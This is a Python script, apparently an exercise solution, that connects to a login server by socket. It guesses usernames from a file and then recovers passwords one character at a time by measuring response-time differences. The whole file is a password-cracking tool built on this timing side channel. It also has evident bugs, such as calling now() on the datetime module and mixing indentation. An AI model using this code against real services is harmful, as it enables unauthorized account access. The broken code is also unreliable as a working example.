# write your code here
import sys
import socket
import itertools
import json
import datetime

args = sys.argv


# hostname, port, message = args[1], int(args[2]), args[3]
# Collect arguments from command-line
hostname, port = args[1], int(args[2])


def socket_connect():
	new_socket = socket.socket()
	address = hostname, port
	new_socket.connect(address)
	return new_socket


def generate_alphanumeric_list():
	letters = list(map(lambda x: chr(x), list(range(ord('a'), ord('z') + 1))))
	numbers = list(map(lambda x: str(x), list(range(0, 10))))
	return letters + numbers


def send_message(sock, message):
	message = message.encode()
	sock.send(message)


def generate_combinations(string):
	string = string.lower()
	mx = 2 ** len(string)

	# Using all subsequences and permuting them
	for i in range(mx):
		combination = [k for k in string]
		for j in range(len(string)):
			if ((i >> j) & 1) == 1:
				combination[j] = string[j].upper()

		yield "".join(combination)


def get_pass(client_socket, login, letters=""):
    alpha = generate_alphanumeric_list()
    differences = []
    exit_flag = False
    result = ''
    for ch in alpha:
        json_string1 = json.dumps({"login": login, "password": letters + ch})
        start = datetime.now()
        client_socket.send(json_string1.encode())
        response1 = client_socket.recv(1024)
        finish = datetime.now()
        response1 = response1.decode()
        decoded_data1 = json.loads(response1)
        difference = finish - start
        if decoded_data1["result"] == "Connection success!":
            exit_flag = True
            result = json_string1
            break
        differences.append((difference, ch))
    max_diff = max(differences)
    if not exit_flag:
        return get_pass(client_socket, login, letters + max_diff[1])
    else:
        return result


def main():
	passwords = []
	logins = []
	password_flag = False
	login_flag = False
	new_socket = socket_connect()
	alphanumeric = generate_alphanumeric_list()

	with open("logins.txt", "r") as login_file:
		logins = login_file.read().split("\n")

	real_login = ""
	for login in logins:
		message = {"login": login, "password": ""}
		json_message = json.dumps(message, indent=4)
		send_message(new_socket, json_message)
		response = new_socket.recv(1024).decode()
		json_response = json.loads(response)
		if json_response["result"] == "Wrong password!" or json_response["result"] == \
				"Exception happened during login":
				print(get_pass(new_socket, login))
	new_socket.close()


main()

